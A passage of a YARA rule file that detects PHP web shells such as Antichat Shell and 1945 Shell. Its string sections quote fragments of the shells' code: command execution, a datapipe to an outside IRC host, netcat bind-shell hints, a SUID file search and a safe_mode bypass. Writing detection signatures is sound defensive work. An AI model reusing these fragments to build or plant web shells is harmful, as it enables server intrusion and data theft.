      $s3 = "e=\"text\" name=\"dump_file\" size=\"30\" value=\"<?php echo \"dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-" ascii
      $s4 = "<OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Sui" fullword ascii
      $s5 = "o htmlspecialchars($cmd); ?>\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Exec" ascii
      $s6 = "/select><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr>" ascii
      $s7 = "echo \"<br>Trying To Get File <font color=#000099><b>$get</b></font><br>\";" fullword ascii
      $s8 = "if ($parsesort[1] != \"a\") {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"a\\\">" ascii
      $s9 = "if ($parsesort[1] != \"a\") {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"a\\\">" ascii
      $s10 = "else {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"d\\\"><img src=\\\"\".$surl." ascii
      $s11 = "else {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"d\\\"><img src=\\\"\".$surl." ascii
      $s12 = "?>\">&nbsp;<input type=\"submit\" name=\\\"submit\\\" value=\"Dump\"></form></td><td width=\"30%\" height=\"1\"></td></tr><tr><t" ascii
      $s13 = "echo \"Trying To List Folder <font color=#000099><b>$chemin</b></font><br>\";" fullword ascii
      $s14 = "if(isset($_GET['directory']))" fullword ascii
      $s15 = "$chemin=$_GET['directory'];" fullword ascii
      $s16 = "echo \"<div class=\\\"shell\\\"><b>Start $get</b><br><br><font color=\\\"white\\\">$source</font><br><b><br>Fin <font color=#000" ascii
      $s17 = "oad&d=\".$ud.\"\\\"><img src=\\\"\".$surl.\"act=img&img=download\\\" alt=\\\"Download\\\" height=\\\"16\\\" width=\\\"19\\\" bor" ascii
      $s18 = "alue=\\\"1\\\"><br><br>Logging?&nbsp;<input type=\\\"checkbox\\\" name=\\\"fqb_logging\\\" value=\\\"1\\\" checked><br>Logging t" ascii
      $s19 = "t value=\"cmd\"><input type=hidden name=\"d\" value=\"<?php echo $dispd; ?>\"><input type=\"text\" name=\"cmd\" size=\"50\" valu" ascii
      $s20 = "g to e-mail?&nbsp;<input type=\\\"text\\\" name=\\\"fqb_logemail\\\" value=\\\"\".$log_email.\"\\\" size=\\\"\".(strlen($logemai" ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x733c ) and filesize < 700KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _34127df2be5061288e2863da49b977a4a025273f_5425e9f71fca02fd3ac7a3ffa8dbd254afec8213_55254f8f1d961c9a832cf2c3f7747b3e510efbdf__237
{
   meta:
      description = "php17 - from files 34127df2be5061288e2863da49b977a4a025273f.php, 5425e9f71fca02fd3ac7a3ffa8dbd254afec8213.php, 55254f8f1d961c9a832cf2c3f7747b3e510efbdf.php, 9735037eae2f73171d007caca31fbfb6467850d5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "43411e7e750ebfe589cc4004da7b67e907c6f2cfe868a00962ff6b08b515e4c2"
      hash2 = "0f7aad3e734d2a719d82358afda9ec240e8bd58999d0b76e75f3d5f4dda38985"
      hash3 = "80a13546c401bbf7495b74bfeb0d78d293dd5289b64b3af936cc00372daeacc2"
      hash4 = "0a18abae4ed20eb3140925b78cce995a272b596f97191b1fb08024942ee7c854"
   strings:
      $x1 = "if(!empty($_POST['run'])) echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? '" fullword ascii
      $s2 = "<a href=\"?s=e&fp='.urlencode($sp).'&fn='.$Filename.'&dim='.urlencode($key).'\" target=\"_blank\">" fullword ascii
      $s3 = "<li><a href=\"?s=k\" id=\"t_10\" onclick=\"switchTab('t_10')\" target=\"main\"> " fullword ascii
      $s4 = "</a> <a href=\"?s=e&df='.urlencode($Filepath).'\" target=\"_blank\">" fullword ascii
      $s5 = "if(gourl == 'b'){document.getElementById('actall').value = escape(gourl);document.getElementById('fileall').submit();}" fullword ascii
      $s6 = "<form method=\"POST\" name=\"hform\" id=\"hform\" action=\"?s=h&o={$object}\"><br>" fullword ascii
      $s7 = "<div class=\"actall\" style=\"height:100px;\"><form method=\"POST\" name=\"tform\" id=\"tform\" action=\"?s=e\">" fullword ascii
      $s8 = "<div class=\"actall\" style=\"height:100px;\"><form method=\"POST\" name=\"lform\" id=\"lform\" action=\"?s=l\">" fullword ascii
      $s9 = "IP<br><input type=\"text\" name=\"ip\" value=\"127.0.0.1\" style=\"width:600px;\">" fullword ascii
      $s10 = "<form method=\"POST\" id=\"fileall\" action=\"?s=a&p={$THIS_DIR}\">" fullword ascii
      $s11 = "if(document.getElementById('tca').value == '' || document.getElementById('tcb').value == ''){alert('" fullword ascii
      $s12 = "<form method=\"GET\"><input type=\"hidden\" name=\"s\" value=\"a\">" fullword ascii
      $s13 = "<div class=\"actall\"><form method=\"POST\" name=\"gform\" id=\"gform\" action=\"?s=g\">" fullword ascii
      $s14 = "<div class=\"topbg\"> &nbsp; {$Server_IP} - {$Server_OS} </div>" fullword ascii
      $s15 = "<div class=\"actall\"><textarea name=\"pfc\" style=\"width:750px;height:380px;\">{$FILE_CODE}</textarea></div>" fullword ascii
      $s16 = "<input type=\"radio\" name=\"inout\" onclick=\"gl.disabled=true;\" checked>" fullword ascii
      $s17 = "<a href=\"?s=h&o=application\">[Shell.Application]</a></div>" fullword ascii
      $s18 = "<input type=\"radio\" name=\"inout\" onclick=\"gl.disabled=false;\">" fullword ascii
      $s19 = "<div class=\"actall\" style=\"height:35px;\"><input type=\"radio\" name=\"incode\" value=\"1\" checked>" fullword ascii
      $s20 = "<input type=\"hidden\" name=\"inver\" value=\"undefined\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _05311655a15b75fab86956663e1819cd_0ad17701cf5e5a59aa57f35aa240d9e40d28ba50_0b544ac96e173af11ffee87dee8aad446339801e_15e786a3_238
{
   meta:
      description = "php17 - from files 05311655a15b75fab86956663e1819cd.php, 0ad17701cf5e5a59aa57f35aa240d9e40d28ba50.php, 0b544ac96e173af11ffee87dee8aad446339801e.php, 15e786a334203308d12856d155bbdb8088ed8afc.php, 32e36b9cd77416c8e4d5d7284d54683e75abfed6.php, 4d5d25e5c18789e5e3977c1d7f6035576a7e2ea3.php, 6a6f0260611dcd60d502d308f74ff3c1ad590cfe.php, 8cb6a80a86bf37cd3977cab94909c299ec22a092.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      hash2 = "59f77ca5eb2380fcee10e7282bdcbb628a075bd83ff3dfabd2b8851cc80a466b"
      hash3 = "12e93dd17c20d1aef103ccc66e1b7d5b3849b81a0ab88e8c03777a7a88fbebf0"
      hash4 = "f89d440580f05dbadc7464f2ef8d0048d367422d6fce60995a0f33467284e503"
      hash5 = "5ac936e86e90cda1df398a4f3044c9d6d1707bc6ddf5d1bbdfc9e03553ff907b"
      hash6 = "ce802123ee19441adab36ef70584cfadbbda898ed1d52082a08532e20c860dc1"
      hash7 = "178ec234348b08e4da3d0d26f0e0db9637184e9fb4aec6b7345a5521c54456ac"
      hash8 = "f5e8951fddabbfebee6f93380486d027fd88f05623f3856dcf81ae05e78d9da6"
   strings:
      $s1 = "list($datapipe[\"remotehost\"],$datapipe[\"remoteport\"]) = explode(\":\",$datapipe[\"remoteaddr\"]);" fullword ascii
      $s2 = "if (empty($datapipe[\"remoteaddr\"])) {$datapipe[\"remoteaddr\"] = \"irc.dalnet.ru:6667\";}" fullword ascii
      $s3 = "if (empty($bc[\"host\"])) {$bc[\"host\"] = getenv(\"REMOTE_ADDR\");}" fullword ascii
      $s4 = "echo \"Now script try connect to \".htmlspecialchars($bc[\"host\"]).\":\".htmlspecialchars($bc[\"port\"]).\"...<br>\";" fullword ascii
      $s5 = "$v[1] = str_replace(\"%remotehost\",$datapipe[\"remotehost\"],$v[1]);" fullword ascii
      $s6 = "\".$datapipe[\"remoteaddr\"].\"</b>! You should use NetCat&copy;, run \\\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"port" ascii
      $s7 = "echo \"<b>Result of datapipe-running:</b><br>\";" fullword ascii
      $s8 = "$sock = fsockopen(\"localhost\",$datapipe[\"port\"],$errno,$errstr,5);" fullword ascii
      $s9 = "$v[1] = str_replace(\"%remoteport\",$datapipe[\"remoteport\"],$v[1]);" fullword ascii
      $s10 = "if (!is_numeric($datapipe[\"localport\"])) {$datapipe[\"localport\"] = $datapipe_localport;}" fullword ascii
      $s11 = "if (!$sock) {echo \"I can't connect to localhost:\".$datapipe[\"localport\"].\"! I think you should configure your firewall.\";}" ascii
      $s12 = "if (!is_array($datapipe)) {$datapipe = array();}" fullword ascii
      $s13 = "elseif (fsockopen(getenv(\"SERVER_ADDR\"),$bind[\"port\"],$errno,$errstr,0.1)) {echo \"Port alredy in use, select any other!<br>" ascii
      $s14 = "elseif (fsockopen(getenv(\"SERVER_ADDR\"),$datapipe[\"port\"],$errno,$errstr,0.1)) {echo \"Port alredy in use, select any other!" ascii
      $s15 = "elseif (fsockopen(getenv(\"SERVER_ADDR\"),$datapipe[\"port\"],$errno,$errstr,0.1)) {echo \"Port alredy in use, select any other!" ascii
      $s16 = "else {echo \"Running datapipe... ok! Connect to <b>\".getenv(\"SERVER_ADDR\").\":\".$datapipe[\"port\"].\", and you will connect" ascii
      $s17 = "$v = $dpsrcs[$datapipe[\"src\"]];" fullword ascii
      $s18 = "$srcpath = $tmpdir.$datapipe[\"src\"];" fullword ascii
      $s19 = "$v[1] = str_replace(\"%localport\",$datapipe[\"localport\"],$v[1]);" fullword ascii
      $s20 = "$w = explode(\".\",$datapipe[\"src\"]);" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x6544 or uint16(0) == 0x2a2f ) and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Antichat_Shell_Modified_by_Go0o_Antichat_Shell_v1_3_2_Antichat_Shell_239
{
   meta:
      description = "php17 - from files Antichat-Shell-Modified-by-Go0o.php, Antichat-Shell-v1.3_2.php, Antichat-Shell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "176def90c34fe4bb92b70f326e41fea5b020de5ab9ddba7e7137f49668353955"
      hash2 = "f86f79b08217680a4b03243e52d87eacd27045a36dc44b824022ed1674b4d59b"
      hash3 = "107264a7573cf1db946f6997395e6eb57586dc1eec5c37139e4affceb270889b"
   strings:
      $x1 = "$header = '<html><head><title>' . getenv(\"HTTP_HOST\") . ' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"" ascii
      $x2 = "$header = '<html><head><title>' . getenv(\"HTTP_HOST\") . ' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"" ascii
      $s3 = "<textarea name=\\\"command\\\" rows=\\\"5\\\" cols=\\\"150\\\">\" . @$_POST['command'] . \"</textarea><br>" fullword ascii
      $s4 = "html; charset=windows-1251\">' . $style . '</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';" fullword ascii
      $s5 = "header('Content-Disposition: attachment; filename=\"' . $file . '\"');" fullword ascii
      $s6 = "header('Content-Length:' . filesize($file) . '');" fullword ascii
      $s7 = "// downloader" fullword ascii
      $s8 = "if ($action == \"download\") {" fullword ascii
      $s9 = "<input type=\\\"hidden\\\" name=\\\"file\\\" value=\\\"\" . $file . \"\\\">" fullword ascii
      $s10 = "$dir = getcwd() . \"/\";" fullword ascii
      $s11 = "// shell" fullword ascii
      $s12 = "if (! empty($cmd)) {" fullword ascii
      $s13 = "<table style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0" fullword ascii
      $s14 = "border=\"0\" cellspacing=\"0\" cellpadding=\"0\">" fullword ascii
      $s15 = "for ($j = ord('C'); $j <= ord('Z'); $j ++)" fullword ascii
      $s16 = "for ($i = 0; $i < count($dire); $i ++) {" fullword ascii
      $s17 = "function readf($file)" fullword ascii
      $s18 = "$dir = str_replace(\"\\\\\", \"/\", $dir);" fullword ascii
      $s19 = "borderColorLight=#c0c0c0 border=1>" fullword ascii
      $s20 = "if (@$dh = opendir(chr($j) . \":/\"))" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _15e31a66891cbd2c55427678d32f149faf39a0ce_38975df7b993b077a499861b7f4de34d8439ddf3_a9f6388eac0eaa83fb918cec6a54a073818c7682_240
{
   meta:
      description = "php17 - from files 15e31a66891cbd2c55427678d32f149faf39a0ce.php, 38975df7b993b077a499861b7f4de34d8439ddf3.php, a9f6388eac0eaa83fb918cec6a54a073818c7682.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "734eb849b064304217773d4ecc46c8d9fcd611bdf3c011acfa3da38c208a272c"
      hash2 = "ea743427978d01e07b5aa14268ccc59fde773633a70747659af1a80da4ed0e02"
      hash3 = "ef6dd73e7cc055e1bd6e1618fbfc44f0043e15a6f2206d0c43f6f4b13646e569"
   strings:
      $s1 = "$link=pg_connect(\"host=$host dbname=$db user=$user password=$pass\");" fullword ascii
      $s2 = "$server=$_REQUEST['serveR'];$type=$_REQUEST['typE'];$pass=$_REQUEST['pasS'];$user=$_REQUEST['useR'];$query=$_REQUEST['querY'];" fullword ascii
      $s3 = "if(!empty($_REQUEST['serveR']) && !empty($_REQUEST['useR']) && isset($_REQUEST['pasS']) && !empty($_REQUEST['querY'])){" fullword ascii
      $s4 = "ociexecute($stm,OCI_DEFAULT);" fullword ascii
      $s5 = "function querY($type,$host,$user,$pass,$db='',$query){" fullword ascii
      $s6 = "while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';" fullword ascii
      $s7 = "$link=ocilogon($user,$pass,$db);" fullword ascii
      $s8 = "$link=mysql_connect($host,$user,$pass);" fullword ascii
      $s9 = "$link=mssql_connect($host,$user,$pass);" fullword ascii
      $s10 = "while($data=mysql_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';" fullword ascii
      $s11 = "while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';" fullword ascii
      $s12 = "while($data=mssql_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';" fullword ascii
      $s13 = "$res=querY($type,$server,$user,$pass,$db,$query);" fullword ascii
      $s14 = "$db=(empty($_REQUEST['dB']))?'':$_REQUEST['dB'];" fullword ascii
      $s15 = "if(empty($_REQUEST['typE']))$_REQUEST['typE']='';" fullword ascii
      $s16 = "$res.=oci_field_name($stm,$i).'[-][-][-]';" fullword ascii
      $s17 = "$res.=mssql_field_name($result,$i).'[-][-][-]';" fullword ascii
      $s18 = "$res.=pg_field_name($result,$i).'[-][-][-]';" fullword ascii
      $s19 = "$res.=mysql_field_name($result,$i).'[-][-][-]';" fullword ascii
      $s20 = "for($i=0;$i<pg_num_fields($result);$i++)" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _05311655a15b75fab86956663e1819cd_0b544ac96e173af11ffee87dee8aad446339801e_32e36b9cd77416c8e4d5d7284d54683e75abfed6_6a6f0260_241
{
   meta:
      description = "php17 - from files 05311655a15b75fab86956663e1819cd.php, 0b544ac96e173af11ffee87dee8aad446339801e.php, 32e36b9cd77416c8e4d5d7284d54683e75abfed6.php, 6a6f0260611dcd60d502d308f74ff3c1ad590cfe.php, 8cb6a80a86bf37cd3977cab94909c299ec22a092.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      hash2 = "12e93dd17c20d1aef103ccc66e1b7d5b3849b81a0ab88e8c03777a7a88fbebf0"
      hash3 = "5ac936e86e90cda1df398a4f3044c9d6d1707bc6ddf5d1bbdfc9e03553ff907b"
      hash4 = "178ec234348b08e4da3d0d26f0e0db9637184e9fb4aec6b7345a5521c54456ac"
      hash5 = "f5e8951fddabbfebee6f93380486d027fd88f05623f3856dcf81ae05e78d9da6"
   strings:
      $s1 = "echo \"<TABLE cellSpacing=0 cellPadding=2 bgColor=#000000 borderColorLight=#000000 border=1><td><b>ID</b></td><td><b>USER</b" fullword ascii
      $s2 = "echo \"<TABLE cellSpacing=0 cellPadding=2 bgColor=#000000 borderColorLight=#000000 border=1><td><b>ID</b></td><td><b>USER</b></t" ascii
      $s3 = "echo \"<TABLE cellSpacing=0 cellPadding=0 bgColor=#000000 borderColorLight=#000000 border=1><td><b>Name</b></td><td><b>Value" fullword ascii
      $s4 = "?><h3>Attention! SQL-Manager is <u>NOT</u> ready module! Don't reports bugs.</h3><TABLE style=\"BORDER-COLLAPSE: collapse\" heig" ascii
      $s5 = "lPadding=5 height=\"1\" width=\"100%\" bgColor=#000000 borderColorLight=#c0c0c0 border=1>" fullword ascii
      $s6 = "echo \"<br><form method=\\\"POST\\\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\\\"100%\\\" bgColor=#0000" ascii
      $s7 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" b" ascii
      $s8 = "else {$safemode = FALSE; $hsafemode = \"<font color=green>OFF (no secure)</font>\";}" fullword ascii
      $s9 = "echo \"<form method=\\\"POST\\\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\\\"1%\\\" bgColor=#000000 bor" ascii
      $s10 = "echo \"<br><form method=\\\"POST\\\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\\\"1%\\\" bgColor=#000000" ascii
      $s11 = "echo \"<br><form method=\\\"POST\\\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\\\"1%\\\" bgColor=#000000" ascii
      $s12 = "echo \"<form method=\\\"POST\\\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\\\"1%\\\" bgColor=#000000 bor" ascii
      $s13 = "echo \"<br><form method=\\\"POST\\\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\\\"100%\\\" bgColor=#0000" ascii
      $s14 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" b" ascii
      $s15 = "if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo \"<TABLE style=\\\"BORDER-COLLAPSE: collapse\\\" cellSpacin" ascii
      $s16 = "echo \"<center><b>Listing folder (\".count($tab[\"files\"]).\" files and \".(count($tab[\"folders\"])+count($tab[\"links\"])).\"" ascii
      $s17 = "orderColorDark=#666666 cellPadding=5 width=\\\"100%\\\" bgColor=#000000 borderColorLight=#c0c0c0 border=1><tr><td width=\\\"100%" ascii
      $s18 = "t=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#000000 borderColorLight=#c0c0c0 border=1 borderc" ascii
      $s19 = "echo \"<TABLE height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\\\"100%\\\" bgColor=#000000 borderColorLight=#" ascii
      $s20 = "echo \"<TABLE height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\\\"100%\\\" bgColor=#000000 borderColorLight=#" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _031d3c46f8a4462cf23accc3aaecf840f77d9a30_35940353c0f3d6511e2789fc3cb9e5b3cea3b10d_5bcb3adc55b62f4e43f154b29d31cced0cbd32a5__242
{
   meta:
      description = "php17 - from files 031d3c46f8a4462cf23accc3aaecf840f77d9a30.php, 35940353c0f3d6511e2789fc3cb9e5b3cea3b10d.php, 5bcb3adc55b62f4e43f154b29d31cced0cbd32a5.php, 918af72b83a165b25283dbd8f1490309dfdb77da.php, 942e0fc9984256f2bdb17f8d0c77a7afacb7b112.php, 95570807b7c1a0531c134fb85c98cdc4ff63ee9b.php, a79be3a055b701ad9977b5176d0478aa0b0dffd4.php, abdbeae0be991e8bab37946a1b55df5af144a0a8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash2 = "9ecdb14b41785c779d9721e11bf9e1b7e35611015f4aabf9a1f54a82eaa0725c"
      hash3 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
      hash4 = "589ad371c414fae2d6f1f0ef7d197cf495bf06d1a0e367f9c3907b77f3054299"
      hash5 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
      hash6 = "97ba3775928dacbf6b4d58416752db2113af88aa914bc35e7b2a7ddf73f70d8b"
      hash7 = "b7c6ce332434850db4448f8d2bf26157a6aa4ae1afb43bd5829ee6167b561c85"
      hash8 = "1a2bed0ae0b8846eb567043a998ad835d7e4103abcd6618e4ccb01a2a73a9ec9"
   strings:
      $s1 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=(!$unix)?(\"dir\"):(\"ls -lia\"); }" fullword ascii
      $s2 = "'eng_text115'=>'Test bypass safe_mode, copy file via compress.zlib:// in function copy()'," fullword ascii
      $s3 = "if(@copy(\"compress.zlib://\".$_POST['test8_file1'], $_POST['test8_file2'])) echo $lang[$language.'_text118'];" fullword ascii
      $s4 = "echo $fs.$table_up1.div_title($lang[$language.'_text15'],'id15').$table_up2.div('id15').$ts;" fullword ascii
      $s5 = "echo $fs.$table_up1.div_title($lang[$language.'_text54'],'id7').$table_up2.div('id7').$ts;" fullword ascii
      $s6 = "echo $fs.$table_up1.div_title($lang[$language.'_text94'],'id18').$table_up2.div('id18').$ts;" fullword ascii
      $s7 = "echo $fs.$table_up1.div_title($lang[$language.'_text85'],'id13').$table_up2.div('id13').$ts;" fullword ascii
      $s8 = "echo $fs.$table_up1.div_title($lang[$language.'_text86'],'id16').$table_up2.div('id16').$ts;" fullword ascii
      $s9 = "echo $fs.$table_up1.div_title($lang[$language.'_text76'],'id8').$table_up2.div('id8').$ts;" fullword ascii
      $s10 = "echo $fs.$table_up1.div_title($lang[$language.'_text35'],'id12').$table_up2.div('id12').$ts;" fullword ascii
      $s11 = "echo $fs.$table_up1.div_title($lang[$language.'_text113'],'id23').$table_up2.div('id23').$ts;" fullword ascii
      $s12 = "echo $fs.$table_up1.div_title($lang[$language.'_text112'],'id22').$table_up2.div('id22').$ts;" fullword ascii
      $s13 = "echo $fs.$table_up1.div_title($lang[$language.'_text67'],'id5').$table_up2.div('id5').$ts;" fullword ascii
      $s14 = "echo $fs.$table_up1.div_title($lang[$language.'_text114'],'id24').$table_up2.div('id24').$ts;" fullword ascii
      $s15 = "echo $fs.$table_up1.div_title($lang[$language.'_text7'],'id6').$table_up2.div('id6').$ts;" fullword ascii
      $s16 = "echo $fs.$table_up1.div_title($lang[$language.'_text33'],'id10').$table_up2.div('id10').$ts;" fullword ascii
      $s17 = "echo $fs.$table_up1.div_title($lang[$language.'_text115'],'id25').$table_up2.div('id25').$ts;" fullword ascii
      $s18 = "echo $table_up1.div_title($lang[$language.'_text5'],'id14').$table_up2.div('id14').$ts;" fullword ascii
      $s19 = "if(!empty($_POST['new_name'])) { $nfn = $_POST['new_name']; }" fullword ascii
      $s20 = "echo $fs.$table_up1.div_title($lang[$language.'_text32'],'id9').$table_up2.$font;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _031d3c46f8a4462cf23accc3aaecf840f77d9a30_144b414a2168fecf31591bbe049e1424ccff4899_1477fa53e5e56605fe001c88831fcb71e30d6e86__243
{
   meta:
      description = "php17 - from files 031d3c46f8a4462cf23accc3aaecf840f77d9a30.php, 144b414a2168fecf31591bbe049e1424ccff4899.php, 1477fa53e5e56605fe001c88831fcb71e30d6e86.php, 1dc03138e5406f8e1f850181e92084ed0f4b5302.php, 35940353c0f3d6511e2789fc3cb9e5b3cea3b10d.php, 5bcb3adc55b62f4e43f154b29d31cced0cbd32a5.php, 649515a5730e7baa0303b29ce49f7e142b88c2ce.php, 8d851537dff4dc80cdc23f57784bbf0bd7b4431c.php, 91241fc05105627c2f58942867db10b2b691574e.php, 918af72b83a165b25283dbd8f1490309dfdb77da.php, 942e0fc9984256f2bdb17f8d0c77a7afacb7b112.php, 95570807b7c1a0531c134fb85c98cdc4ff63ee9b.php, a79be3a055b701ad9977b5176d0478aa0b0dffd4.php, abdbeae0be991e8bab37946a1b55df5af144a0a8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash2 = "1fe4c60ea3f32819a98b1725581ac912d0f90d497e63ad81ccf258aeec59fee3"
      hash3 = "124a69cac6fa533abd737127a65ad261a4da66148bf1bdc341e3f733966b5ad6"
      hash4 = "bbbdf28407a4c943f048dcdd7da7515e42797a64b76fd2455e5403b436ec4de8"
      hash5 = "9ecdb14b41785c779d9721e11bf9e1b7e35611015f4aabf9a1f54a82eaa0725c"
      hash6 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
      hash7 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
      hash8 = "f27b491508d18cbfb6f3e57aafcabe5826a2f0098b187ad6459f40b5812c36e0"
      hash9 = "2e5511e45b7c9c6ca7e263ee8d8271214b2b6aae20f2796f4db7b53639f7a699"
      hash10 = "589ad371c414fae2d6f1f0ef7d197cf495bf06d1a0e367f9c3907b77f3054299"
      hash11 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
      hash12 = "97ba3775928dacbf6b4d58416752db2113af88aa914bc35e7b2a7ddf73f70d8b"
      hash13 = "b7c6ce332434850db4448f8d2bf26157a6aa4ae1afb43bd5829ee6167b561c85"
      hash14 = "1a2bed0ae0b8846eb567043a998ad835d7e4103abcd6618e4ccb01a2a73a9ec9"
   strings:
      $s1 = "if(empty($sysctl)) { $sysctl = ex('sysctl -n kernel.ostype && sysctl -n kernel.osrelease'); }" fullword ascii
      $s2 = "if(!isset($_COOKIE['uname'])) { $uname = ex('uname -a'); setcookie('uname',$uname); } else { $uname = $_COOKIE['uname']; }" fullword ascii
      $s3 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"mail_file\" && !empty($_POST['loc_file']))" fullword ascii
      $s4 = "else echo ws(3).\"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid().\"<br>\";" fullword ascii
      $s5 = "echo ws(3).'uid='.$euserinfo['uid'].' ( '.$euserinfo['name'].' ) gid='.$egroupinfo['gid'].' ( '.$egroupinfo['name'].' )<br>';" fullword ascii
      $s6 = "else { err(2,$_POST['mk_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s7 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"mail\")" fullword ascii
      $s8 = "$res = mail($_POST['to'],$_POST['subj'],$_POST['text'],\"From: \".$_POST['from'].\"\\r\\n\");" fullword ascii
      $s9 = "if(!isset($_COOKIE['id'])) { $id = ex('id'); setcookie('id',$id); } else { $id = $_COOKIE['id']; }" fullword ascii
      $s10 = "$euserinfo  = @posix_getpwuid(@posix_geteuid());" fullword ascii
      $s11 = "echo ws(3).@getenv(\"USERNAME\").\"<br>\";" fullword ascii
      $s12 = "else if(isset($_COOKIE['sysctl'])) { $sysctl = $_COOKIE['sysctl']; }" fullword ascii
      $s13 = "$r .= (!$unix)? str_replace(\"/\",\"\\\\\",$file) : $file;" fullword ascii
      $s14 = "if(strlen($dir)>1 && $dir[1]==\":\") $unix=0; else $unix=1;" fullword ascii
      $s15 = "foreach ($_COOKIE as $k=>$v)" fullword ascii
      $s16 = "function in($type,$name,$size,$value,$checked=0)" fullword ascii
      $s17 = "setcookie('sysctl',$sysctl);" fullword ascii
      $s18 = "if(!empty($id)) { echo ws(3).$id.\"<br>\"; }" fullword ascii
      $s19 = "if(@eregi(\"^win\",$os)) { $unix = 0; }" fullword ascii
      $s20 = "if($safe_mode) { $sysctl = '-'; }" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _1945_september_1945_244
{
   meta:
      description = "php17 - from files 1945-september.php, 1945.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d53f94ebc03dc951bbb7b8cff74aad018009c8a55f91e9109870da89d97cf0c3"
      hash2 = "a00fdb17c16cad64a5a5f607d7b71e3e0bc8992ec91e72be1029ddf9956789a9"
   strings:
      $x1 = "error_log(0);ob_start();error_reporting(0);set_time_limit(0);@ini_set('error_log',NULL);@ini_set('log_errors',0);@ini_set('max_e" ascii
      $s2 = "$loguri_1945  = \"?login=1945\"; // login url , default : shell.php?login=1945" fullword ascii
      $s3 = "//-------------------------------- 1945 Shell - 1945v2017 ---------------------------------" fullword ascii
